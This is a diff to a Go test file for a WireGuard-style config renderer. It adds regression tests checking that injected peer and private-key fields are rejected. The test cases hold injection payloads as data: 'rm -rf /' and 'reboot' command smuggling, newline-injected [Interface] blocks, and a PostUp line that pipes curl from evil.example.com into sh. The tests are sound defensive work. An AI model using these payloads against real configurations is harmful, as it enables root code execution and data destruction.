@@ -7,9 +7,21 @@ import (
 	"testing"
 )
 
+// Wave-14 #1: renderConfig now whitelists base64-32-byte WG keys to prevent
+// INI injection (newlines / brackets in a panel-pushed key could smuggle a
+// [Interface] PostUp=sh -c block and RCE awg-quick). Test fixtures need
+// real-shape keys instead of placeholder strings. All-zero (priv) and
+// 0x04-prefixed-zero (pub) are valid 32-byte base64.
+const (
+	testWGPrivKey  = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
+	testWGPubKeyA  = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
+	testWGPubKeyB  = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
+	testWGPubKeyC  = "DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
+)
+
 func validInbound() InboundConfig {
 	return InboundConfig{
-		PrivateKey: "fake-server-priv-base64",
+		PrivateKey: testWGPrivKey,
 		Address:    "10.66.66.1/24",
 		Jc:         4, Jmin: 40, Jmax: 70,
 		S1: 72, S2: 56, S3: 32, S4: 16,
@@ -75,7 +87,7 @@ func TestRenderConfigInterfaceBlock(t *testing.T) {
 	}
 	for _, want := range []string{
 		"[Interface]",
-		"PrivateKey = fake-server-priv-base64",
+		"PrivateKey = " + testWGPrivKey,
 		"ListenPort = 51820",
 		"Address = 10.66.66.1/24",
 		"Jc = 4",
@@ -97,8 +109,8 @@ func TestRenderConfigInterfaceBlock(t *testing.T) {
 
 func TestRenderConfigPeers(t *testing.T) {
 	peers := []Peer{
-		{PublicKey: "pub-alice", AllowedIP: "10.0.0.2/32"},
-		{PublicKey: "pub-bob", AllowedIP: "10.0.0.3/32"},
+		{PublicKey: testWGPubKeyA, AllowedIP: "10.0.0.2/32"},
+		{PublicKey: testWGPubKeyB, AllowedIP: "10.0.0.3/32"},
 	}
 	out, err := renderConfig(validInbound(), peers)
 	if err != nil {
@@ -108,9 +120,9 @@ func TestRenderConfigPeers(t *testing.T) {
 		t.Errorf("expected 2 [Peer] blocks, got %d. Output:\n%s", strings.Count(out, "[Peer]"), out)
 	}
 	for _, want := range []string{
-		"PublicKey = pub-alice",
+		"PublicKey = " + testWGPubKeyA,
 		"AllowedIPs = 10.0.0.2/32",
-		"PublicKey = pub-bob",
+		"PublicKey = " + testWGPubKeyB,
 		"AllowedIPs = 10.0.0.3/32",
 	} {
 		if !strings.Contains(out, want) {
@@ -123,6 +135,41 @@ func TestRenderConfigRejectsEmptyPeerFields(t *testing.T) {
 	peers := []Peer{{PublicKey: "", AllowedIP: "10.0.0.2/32"}}
 	if _, err := renderConfig(validInbound(), peers); err == nil {
 		t.Errorf("expected error for empty PublicKey")
+	}
+}
+
+// Wave-14 #1 regression — renderConfig must reject any panel-pushed peer
+// field that could break out of [Peer] and inject [Interface]/PostUp shell
+// commands (RCE-as-root via awg-quick). Whitelisted formats: 44-char base64
+// WG keys, valid CIDR strings.
+func TestRenderConfigRejectsInjectedPeerFields(t *testing.T) {
+	cases := []struct {
+		name      string
+		publicKey string
+		allowedIP string
+	}{
+		{"newline in PublicKey", "AAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "10.0.0.2/32"},
+		{"PublicKey too short", "AAAA", "10.0.0.2/32"},
+		{"shell metachar in PublicKey", "AAAA;rm -rf /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "10.0.0.2/32"},
+		{"newline in AllowedIP", testWGPubKeyA, "10.0.0.2/32\n[Interface]"},
+		{"AllowedIP not CIDR", testWGPubKeyA, "10.0.0.2"},
+		{"AllowedIP shell injection", testWGPubKeyA, "10.0.0.2/32; reboot"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			peers := []Peer{{PublicKey: tc.publicKey, AllowedIP: tc.allowedIP}}
+			if _, err := renderConfig(validInbound(), peers); err == nil {
+				t.Errorf("expected validation error for malicious peer field")
+			}
+		})
+	}
+}
+
+func TestRenderConfigRejectsInjectedPrivateKey(t *testing.T) {
+	cfg := validInbound()
+	cfg.PrivateKey = "AAAA\n[Interface]\nPostUp = sh -c 'curl evil.example.com|sh'\nPrivateKey = AAAAAAAAAAAAAAAAAAAAAAA="
+	if _, err := renderConfig(cfg, nil); err == nil {
+		t.Errorf("expected validation error for newline-injected PrivateKey")
 	}
 }
 
